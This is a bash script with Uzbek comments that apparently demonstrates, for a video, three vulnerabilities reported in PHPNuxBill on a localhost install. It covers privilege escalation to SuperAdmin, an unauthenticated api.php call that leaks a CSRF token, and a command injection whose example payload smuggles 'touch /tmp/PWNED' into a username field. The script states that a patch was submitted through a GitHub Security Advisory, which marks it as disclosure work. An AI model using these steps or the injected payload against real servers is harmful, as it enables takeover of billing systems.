#!/bin/bash
# PHPNuxBill CVE Video Demo — 5 daqiqa
TARGET="http://localhost/phpnuxbill"

echo "════════════════════════════════════════════"
echo "  PHPNuxBill CVE Demo — 3 Critical Vulns"
echo "════════════════════════════════════════════"
echo ""

# ===== VULN #1: Privilege Escalation =====
echo "╔══════════════════════════════════════════╗"
echo "║  VULN #1: Privilege Escalation (8.8)    ║"
echo "║  settings.php — user_type validatsiyasi ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "[*] Zaif kod (settings.php):"
sed -n '501p' /var/www/html/phpnuxbill/system/controllers/settings.php
echo ""
echo "[*] Admin login + agent1 yaratish..."
# ... (yuqoridagi to'liq skript)
echo ""
echo "[*] Agent sifatida eviladmin (SuperAdmin) yaratish..."
# ... (yuqoridagi to'liq skript)
echo ""
echo "[🎯] NATIJA:"
sudo mariadb phpnuxbill -e "SELECT id, username, user_type, root FROM tbl_users;"
echo ""
read -p "Davom etish uchun Enter bosing..."
echo ""

# ===== VULN #2: api.php =====
echo "╔══════════════════════════════════════════╗"
echo "║  VULN #2: Unauth API Execution (7.5)    ║"
echo "║  api.php — die() yo'q                   ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "[*] Zaif kod (api.php:123-134):"
sed -n '123,134p' /var/www/html/phpnuxbill/system/api.php
echo ""
echo "[🎯] Token'siz r=login:"
curl -s "$TARGET/system/api.php?r=login" | python3 -m json.tool 2>/dev/null | head -15
echo ""
read -p "Davom etish uchun Enter bosing..."
echo ""

# ===== VULN #3: Command Injection =====
echo "╔══════════════════════════════════════════╗"
echo "║  VULN #3: Command Injection (9.8)       ║"
echo "║  Radius.php:513 — shell_exec            ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "[*] Zaif kod (Radius.php:513):"
sed -n '513p' /var/www/html/phpnuxbill/system/devices/Radius.php
echo ""
echo "[*] Payload: username = 'testuser; touch /tmp/PWNED; #'"
echo "[*] Chaqiruv: home.php:249 → disconnect_customer()"
echo ""
read -p "Davom etish uchun Enter bosing..."
echo ""

# ===== SUMMARY =====
echo "════════════════════════════════════════════"
echo "  XULOSA"
echo "════════════════════════════════════════════"
echo ""
echo "1. Privilege Escalation (CWE-269, CVSS 8.8)"
echo "   → Agent → SuperAdmin"
echo ""
echo "2. Unauth Controller Execution (CWE-287, CVSS 7.5)"
echo "   → api.php?r=login → csrf_token leak"
echo ""
echo "3. Command Injection (CWE-78, CVSS 9.8)"
echo "   → Radius.php:513 → RCE"
echo ""
echo "Zanjir: Agent → SuperAdmin → pluginmanager RCE → full server"
echo ""
echo "Patch: GitHub Security Advisory orqali yuborildi"
echo ""
echo "════════════════════════════════════════════"
